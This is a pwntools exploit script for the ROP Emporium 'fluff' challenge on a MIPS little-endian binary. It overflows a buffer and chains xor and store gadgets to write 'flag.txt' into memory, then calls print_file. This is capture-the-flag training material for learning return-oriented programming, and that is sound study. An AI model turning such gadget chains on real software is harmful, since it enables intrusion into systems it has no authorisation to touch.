from pwn import *

context(arch="mips",endian="little")

elf = ELF("fluff_mipsel")

#p = gdb.debug(elf.path,'''
#        break *pwnme + 300
#        continue
#''')
p = process(elf.path)


print_file_plt = 0x400af0
gadgets2 = 0x400930 # lw $t9, 8($sp) ; lw $t4, 4($sp) ; xor $s1, $s1, $s1 ; lui $a0, 0x41 ; ori $a0, $a0, 0x2c70 ; jalr $t9 ; addi $sp, $sp, 0xc
gadgets3 = 0x40094c # lw $t9, 8($sp) ; lw $s2, 4($sp) ; lui $t4, 0x41 ; ori $t4, $t4, 0x2c74 ; jalr $t9 ; addi $sp, $sp, 0xc
gadgets4 = 0x400964 # lw $t9, 4($sp) ; xor $s1, $s1, $s2 ; lui $a1, 0x41 ; ori $a1, $a1, 0x1500 ; jalr $t9 ; addi $sp, $sp, 8
gadgets5 = 0x40097c # lw $t9, 4($sp) ; xor $s0, $s0, $s1 ; xor $s1, $s0, $s1 ; xor $s0, $s0, $s1 ; lui $t5, 0x41 ; ori $t5, $t5, 0x1504 ; jalr $t9 ; addi $sp, $sp, 8  ## s0:=s1
need_s0_s1 = 0x0040099c# lw $t9, 4($sp) ; sw $s1, ($s0) ; jalr $t9 ; addi $sp, $sp, 8
gadgets6 = 0x4009ac # lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; addi $sp, $sp, 0xc

nonexistent_data = 0x400b70
write_addr = 0x411000

p.recvuntil("> ")

buf = b'A' * 36
buf += p32(gadgets3) # s2 <- write_addr
buf += b'S' * 4
buf += p32(write_addr)
buf += p32(gadgets2) # s1 <- 0
buf += b'S' * 4
buf += b'B'*4 # t4 
buf += p32(gadgets4) # xor s1,s1,s2
buf += b'S' * 4
buf += p32(gadgets5) # xor s0=s1
buf += b'S' * 4
buf += p32(gadgets3) # s2 <- 'flag'
buf += b'S' * 4
buf += b'flag'
buf += p32(gadgets2) # s1 <- 0
buf += b'S' * 4
buf += b'B'*4 # t4 
buf += p32(gadgets4) # xor s1,s1,s2
buf += b'S' * 4
buf += p32(need_s0_s1)
buf += b'S' * 4

buf += p32(gadgets3) # s2 <- write_addr + 4
buf += b'S' * 4
buf += p32(write_addr+4)
buf += p32(gadgets2) # s1 <- 0
buf += b'S' * 4
buf += b'B'*4 # t4 
buf += p32(gadgets4) # xor s1,s1,s2
buf += b'S' * 4
buf += p32(gadgets5) # xor s0=s1
buf += b'S' * 4
buf += p32(gadgets3) # s2 <- '.txt'
buf += b'S' * 4
buf += b'.txt'
buf += p32(gadgets2) # s1 <- 0
buf += b'S' * 4
buf += b'B'*4 # t4 
buf += p32(gadgets4) # xor s1,s1,s2
buf += b'S' * 4
buf += p32(need_s0_s1)
buf += b'S' * 4

buf += p32(gadgets6) # a0 <- write_addr && jmp  print_file
buf += b'S' * 4
buf += p32(print_file_plt)
buf += p32(write_addr)




p.send(buf)
p.interactive()
